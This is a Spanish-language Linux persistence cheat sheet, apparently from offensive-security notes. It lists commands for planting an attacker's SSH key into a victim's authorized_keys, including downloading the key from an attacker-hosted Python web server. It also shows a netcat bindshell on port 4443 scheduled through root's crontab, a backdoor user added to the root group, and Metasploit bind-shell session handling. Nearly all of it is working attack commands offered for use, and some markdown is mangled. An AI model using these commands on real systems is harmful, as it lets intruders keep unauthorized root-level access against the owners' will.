# Linux
# Malicious SSH Key [ *con credenciales* ]
## Generación de par de claves
```bash
**ssh-keygen** -t rsa -b 4096

*# En caso de que se solicite una contraseña tenemos la opción de dejarlo en blanco*
```

## Tranferencia de la clave pública al usuario comprometido
```bash
**ssh-copy-id** *<victim-user>***@***<target-ip-or-hostname>

# Se solicitará la contraseña del usuario*
```

## Conexión con SSH
```bash
**ssh** *<victim-user>***@***<target-ip-or-hostname>*
```

# Malicious SSH Key [ *sin credenciales* ]
## Generación de par de claves
```bash
**ssh-keygen** -t rsa -b 4096

*# En caso de que se solicite una contraseña tenemos la opción de dejarlo en blanco*
```

## Inicialización de servidor Python
```bash
**cd** ~/.ssh/
**
**python3** -m http.server 80

*# Alternativa con Python2.7*
**python2** -m SimpleHTTPServer 80
```

## Descargar archivo [ *máquina atacante* ]
```bash
**wget** http://*<attacker-ip>/id_rsa.pub*

**cat** *id_rsa.pub >> .ssh/authorized_keys*
```

# Malicious Crontab
## Creación de bindshell
```bash
**echo** 'nc -lkvnp 4443 -e /bin/bash >/dev/null &' > /tmp/bindshell
```

## Creación de crontab maliciosa
```bash
**echo '*** * * * * /tmp/bindshell' | sudo tee -a /var/spool/cron/crontabs/root
```

# New User
## Creación de nuevo usuario
```bash
**adduser** -m ****user -s /bin/bash **ftp**
```

## Cambio de contraseña
```bash
**passwd** ftp
```

## Agregar el usuario a grupo root
```bash
**usermod** -aG root **ftp**
```

# Extra
## Obteniendo conexión con Bindshell
```bash
**use** payload/generic/shell_bind_tcp

**set** RHOST <target-ip>

**set** LPORT <local-port>

**exploit**
```

## Obteniendo conexión con Bindshell
```bash
*# CTRL + Z o escribe 'background' para poner la sesión previamente obtenida en segundo plano*

**sessions** -l
**
**sessions** -u <session-id>

**sessions** <session-id>
```